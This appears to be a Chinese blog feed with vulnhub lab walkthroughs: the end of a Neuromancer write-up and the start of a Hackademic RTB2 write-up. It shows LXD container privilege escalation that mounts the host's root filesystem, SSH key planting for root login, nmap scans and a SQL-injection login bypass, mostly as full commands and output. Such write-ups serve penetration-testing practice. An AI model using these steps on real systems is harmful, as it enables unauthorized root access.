class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">Downloading alpine-keys-2.1-r2.apk</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">Downloading apk-tools-static-2.10.4-r3.apk</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: 成功</span><br><span class="line">Verified OK</span><br><span class="line">Selecting mirror http://dl-8.alpinelinux.org/alpine/v3.11/main</span><br><span class="line">fetch http://dl-8.alpinelinux.org/alpine/v3.11/main/x86_64/APKINDEX.tar.gz</span><br><span class="line">(1/19) Installing musl (1.1.24-r0)</span><br><span class="line">(2/19) Installing busybox (1.31.1-r9)</span><br><span class="line">Executing busybox-1.31.1-r9.post-install</span><br><span class="line">(3/19) Installing alpine-baselayout (3.2.0-r3)</span><br><span class="line">Executing alpine-baselayout-3.2.0-r3.pre-install</span><br><span class="line">Executing alpine-baselayout-3.2.0-r3.post-install</span><br><span class="line">(4/19) Installing openrc (0.42.1-r2)</span><br><span class="line">Executing openrc-0.42.1-r2.post-install</span><br><span class="line">(5/19) Installing alpine-conf (3.8.3-r4)</span><br><span class="line">(6/19) Installing libcrypto1.1 (1.1.1d-r3)</span><br><span class="line">(7/19) Installing libssl1.1 (1.1.1d-r3)</span><br><span class="line">(8/19) Installing ca-certificates-cacert (20191127-r0)</span><br><span class="line">(9/19) Installing libtls-standalone (2.9.1-r0)</span><br><span class="line">(10/19) Installing ssl_client (1.31.1-r9)</span><br><span class="line">(11/19) Installing zlib (1.2.11-r3)</span><br><span class="line">(12/19) Installing apk-tools (2.10.4-r3)</span><br><span class="line">(13/19) Installing busybox-suid (1.31.1-r9)</span><br><span class="line">(14/19) Installing busybox-initscripts (3.2-r2)</span><br><span class="line">Executing busybox-initscripts-3.2-r2.post-install</span><br><span class="line">(15/19) Installing scanelf (1.2.4-r0)</span><br><span class="line">(16/19) Installing musl-utils (1.1.24-r0)</span><br><span class="line">(17/19) Installing libc-utils (0.7.2-r0)</span><br><span class="line">(18/19) Installing alpine-keys (2.1-r2)</span><br><span class="line">(19/19) Installing alpine-base (3.11.3-r0)</span><br><span class="line">Executing busybox-1.31.1-r9.trigger</span><br><span class="line">OK: 8 MiB <span class="keyword">in</span> 19 packages</span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">alpine-v3.11-x86_64-20200119_0151.tar.gz  build-alpine  LICENSE  README.md</span><br></pre></td></tr></table></figure>

<p>将alpine-v3.11-x86_64-20200119_0151.tar.gz传输到目标机上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ scp root@192.168.56.102:/root/lxd-alpine-builder/alpine-v3.11-x86_64-20200119_0151.tar.gz /tmp/</span><br><span class="line">root@192.168.56.102<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">alpine-v3.11-x86_64-20200119_0151.tar.gz                                             100% 3151KB   3.1MB/s   00:00    </span></span><br><span class="line"><span class="string">ta@neuromancer:/tmp$ ls</span></span><br><span class="line"><span class="string">alpine-v3.11-x86_64-20200119_0151.tar.gz</span></span><br><span class="line"><span class="string">f</span></span><br><span class="line"><span class="string">hsperfdata_ta</span></span><br><span class="line"><span class="string">systemd-private-14b0eedfa06043179575f7374dc44c6a-systemd-timesyncd.service-EqRj97</span></span><br></pre></td></tr></table></figure>

<p>要导入容器映像，使用以下命令：<br>“别名”是一种引用容器image而不是冗长的文件名的方便方法（根据lxc，它实际上是“指纹”）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc image import alpine-v3.11-x86_64-20200119_0151.tar.gz --<span class="built_in">alias</span> haxor</span><br><span class="line">Image imported with fingerprint: 468c747448ec99c6b76e5a943df89a21489eb5d605ebe5d4c341a78ec217a223</span><br><span class="line">ta@neuromancer:/tmp$ lxc image list</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">| haxor | 468c747448ec | no     | alpine v3.11 (20200119_01:51) | x86_64 | 3.08MB | Jan 19, 2020 at 8:16am (UTC) |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br></pre></td></tr></table></figure>

<p>接下来，您必须基于导入的容器映像创建一个实际的容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc init haxor -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating the container</span><br><span class="line">Container name is: right-whippet</span><br><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | STOPPED |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>

<p>请注意，容器名称是自动分配的。我没有具体说明。尽管来自Ubuntu lxc开发人员很幽默。尽管Booj的文章包含了您需要的所有详细信息，但-c开关选项可以有效地为您提供整个主机文件系统所需的Yoda功能。接下来，需要为新容器（“ right-whippet”）指定磁盘安装选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc config device add right-whippet whatever disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device whatever added to right-whippet</span><br></pre></td></tr></table></figure>

<p>如所见，装载主机文件系统的根目录/（Neuromancer），并装载为该命名（“whatever”）到/mnt/root。现在可以启动容器，然后使用以下命令进入bash会话：</p>
<p>启动容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc start right-whippet</span><br><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | RUNNING |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>

<p>进入bash提权，成功拥有root权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc <span class="built_in">exec</span> right-whippet --mode=interactive /bin/sh</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">~ <span class="comment"># pwd</span></span><br><span class="line">/root</span><br></pre></td></tr></table></figure>

<h2 id="步骤7-证明我们对Neuromancer文件系统具有根目录访问权限"><a href="#步骤7-证明我们对Neuromancer文件系统具有根目录访问权限" class="headerlink" title="步骤7-证明我们对Neuromancer文件系统具有根目录访问权限"></a>步骤7-证明我们对Neuromancer文件系统具有根目录访问权限</h2><p>我们进入容器的/mnt/root目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># cd /mnt/root</span></span><br><span class="line">/mnt/root <span class="comment"># ls</span></span><br><span class="line">bin         etc         lib         media       proc        sbin        sys         var</span><br><span class="line">boot        home        lib64       mnt         root        snap        tmp         vmlinuz</span><br><span class="line">dev         initrd.img  lost+found  opt         run         srv         usr</span><br></pre></td></tr></table></figure>

<p>您实际上是在查看主机（Neuromancer）文件系统的根目录。现在，可以轻松地将cd进入“root”，然后看到最重要的“flag.txt”文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/root <span class="comment"># cd root</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">flag.txt      struts2       velocity.log</span><br><span class="line">/mnt/root/root <span class="comment"># cat flag.txt</span></span><br><span class="line">be3306f431dae5ebc93eebb291f4914a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub169.jpg"></p>
<p>但是我们还没有完成。为了使该计划生效，需要能够写入root（即/mnt/root/root）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/root/root <span class="comment"># echo fuck-all-you-shit &gt; fuck.txt</span></span><br><span class="line">/mnt/root/root <span class="comment"># cat fuck.txt</span></span><br><span class="line">fuck-all-you-shit</span><br></pre></td></tr></table></figure>

<p>是的。有用！所以…现在，只需要获得一个root shell。</p>
<h2 id="步骤8：SSH密钥生成"><a href="#步骤8：SSH密钥生成" class="headerlink" title="步骤8：SSH密钥生成"></a>步骤8：SSH密钥生成</h2><p>现在有了写访问权，需要生成一组ssh密钥。仍在容器bash会话（right-whippet）中时，该过程涉及：</p>
<ul>
<li>运行ssh-keygen。选择您喜欢的任何选项，但确保文件保存到/mnt/root/root/.ssh</li>
<li>创建一个authorized_keys文件: touch /mnt/root/root/.ssh/authorized_keys</li>
<li>将新创建的公共密钥的内容分配到授权密钥文件中： cat /mnt/root/root/.ssh/id_rsa.pub &gt;&gt; authorized_keys</li>
</ul>
<p>将之前/home/ta/.ssh目录下的文件拷贝到/mnt/root/root/.ssh/下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/root/root/.ssh <span class="comment"># cp /mnt/root/home/ta/.ssh/authorized_keys authorized_keys</span></span><br><span class="line">/mnt/root/root/.ssh <span class="comment"># ls</span></span><br><span class="line">authorized_keys  known_hosts</span><br><span class="line">/mnt/root/root/.ssh <span class="comment"># cp /mnt/root/home/ta/.ssh/id_rsa id_rsa</span></span><br><span class="line">/mnt/root/root/.ssh <span class="comment"># cp /mnt/root/home/ta/.ssh/id_rsa.pub id_rsa.pub</span></span><br></pre></td></tr></table></figure>

<p>/mnt/root/root/.ssh的内容现在应如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/root/root/.ssh <span class="comment"># ls</span></span><br><span class="line">authorized_keys  id_rsa           id_rsa.pub       known_hosts</span><br></pre></td></tr></table></figure>

<h2 id="步骤9：将密钥复制到攻击机中"><a href="#步骤9：将密钥复制到攻击机中" class="headerlink" title="步骤9：将密钥复制到攻击机中"></a>步骤9：将密钥复制到攻击机中</h2><p>由于使用的是之前/home/ta/.ssh/目录下的文件，所以连接的话，如下连接即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa -p 34483 root@192.168.56.110</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">94 packages can be updated.</span><br><span class="line">44 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Jul  3 22:02:40 2018</span><br><span class="line">root@neuromancer:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@neuromancer:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@neuromancer:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>成功连接，密码还是之前连接ta的123456</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub170.jpg"></p>
<p>在“right-whippet” sh会话中执行此操作的最简单方法是，将id_rsa和id_rsa.pub的内容显示在屏幕上，然后将其复制/粘贴到您喜欢的文本编辑器中。确保将文件权限更改为chmod 400，否则当尝试使用它们时，这些键将被忽略（我浪费了一些时间想知道为什么直到这样做之前，这些键才一直不起作用）。</p>
<p>现在只想说，太帅会不会帅死人。。。:)))):::)))::))</p>
<h4 id="提权2总结"><a href="#提权2总结" class="headerlink" title="提权2总结"></a>提权2总结</h4><p>总而言之，Neuromancer是一台非常有趣的机器。为了达到目的，必须root另一box（Straylight），然后学习如何正确使用socat进行端口转发。一旦在Neuromancer上使用了低特权shell，特权映射就非常简单了……至少对于内核利用途径而言。但是，很高兴发现lxd提权线索隐藏在范围内.</p>
<p>我只是涉足容器（Docker）之前就某些漏洞进行了一些实验工作，但是从未真正使用容器配置问题来在主机上root。我四处搜寻以确定其他文章是否也涵盖了这个角度，但是到目前为止我还没有发现。因此…最好做一些别人可能会觉得有用的新事情。</p>
<p><font color="red">Neuromancer知识点总结:</font></p>
<ul>
<li>tty可交互式shell</li>
<li>ssh-key毒化</li>
<li>lxd容器提权(new)</li>
<li>scp命令传输文件</li>
<li>tomcat-users.xml密码泄露</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Hackademic-RTB2]</title>
    <url>/2019/12/12/Hackademic-RTB2/</url>
    <content><![CDATA[<p>名称：Hackademic：RTB2<br>发布日期：2011年9月6日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMi56aXA=">https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMi56aXAudG9ycmVudA==">https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>这是mr.pr0n提出的第二个现实黑客攻击挑战<br>下载目标并获得root。<br>毕竟，尝试读取根目录中文件“ key.txt”的内容。<br>请享用！</p>
<p>漏洞：</p>
<ul>
<li>纯文本密码</li>
<li>特权提升</li>
<li>SQL注入</li>
<li>不受限制地上传危险类型的文件</li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.84.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.142</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">MAC Address: 00:0C:29:74:B5:21 (VMware)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.142</span></span><br><span class="line">80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.142</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.142:80/</span><br><span class="line">|     Form id: username</span><br><span class="line">|_    Form action: check.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /phpmyadmin/: phpMyAdmin</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting folder w/ directory listing</span></span><br><span class="line"><span class="string">|_  /index/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.14 (Ubuntu)</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.2.14: </span><br><span class="line">|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425</span><br><span class="line">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span><br><span class="line">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span><br><span class="line">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span><br><span class="line">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span><br><span class="line">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span><br><span class="line">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span><br><span class="line">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span><br><span class="line">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span><br><span class="line">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span><br><span class="line">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span><br><span class="line">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span><br><span class="line">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span><br><span class="line">|       CVE-2012-4557   5.0     https://vulners.com/cve/CVE-2012-4557</span><br><span class="line">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span><br><span class="line">|       CVE-2010-2068   5.0     https://vulners.com/cve/CVE-2010-2068</span><br><span class="line">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span><br><span class="line">|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408</span><br><span class="line">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span><br><span class="line">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span><br><span class="line">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span><br><span class="line">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span><br><span class="line">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span><br><span class="line">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span><br><span class="line">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span><br><span class="line">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span><br><span class="line">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span><br><span class="line">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span><br><span class="line">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span><br><span class="line">|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434</span><br><span class="line">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span><br><span class="line">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span><br><span class="line">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span><br><span class="line">666/tcp filtered doom</span><br></pre></td></tr></table></figure>

<p>经过尝试发现80端口没有什么好东西，666端口被过滤,源代码中没有任何内容，可疑标头，登录中没有sql注入。 我在目标上运行了OpenVAS，Dirbuster和Nikto，但是除了Phpmyadmin界面外，什么都没有发现，无论执行什么操作，该界面始终使我“无法连接到MySQL服务器”错误。 我以为Web服务器可能是一个错误的前端，而这可能是机器上隐藏的其他东西，所以接下来我运行了UDP扫描，它显示了一个附加端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sU -F -n -T4 -v 192.168.84.142</span></span><br><span class="line">5353/udp  open          zeroconf</span><br></pre></td></tr></table></figure>

<p>在<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguODQuMTQzLyVFNyU5OSVCQiVFOSU5OSU4NiVFOSVBMSVCNSVFOSU5RCVBMiVFOCVCRSU5MyVFNSU4NSVBNSYjMzk7">http://192.168.84.143/登陆页面输入&#39;<i class="fa fa-external-link-alt"></i></span> or 1=1–’  ///  ‘ or 1=1–’发现返回了一个页面其中有Ok, nice shot…<br>…but, you are looking in a wrong place bro! ;-),直接右键查看源代码，发现异常字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A</span><br></pre></td></tr></table></figure>

<p>先url解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0a 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 0d 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e</span><br></pre></td></tr></table></figure>

<p>再hex解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; - - - - - - - - - &gt; </span><br><span class="line"> </span><br><span class="line"> K n o c k   K n o c k   K n o c k i n <span class="string">&#x27;   o n   h e a v e n &#x27;</span> s   d o o r   . .   : ) </span><br><span class="line"> </span><br><span class="line"> 0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1 </span><br><span class="line"> </span><br><span class="line"> &lt; - - - - - - - - - &gt;</span><br></pre></td></tr></table></figure>

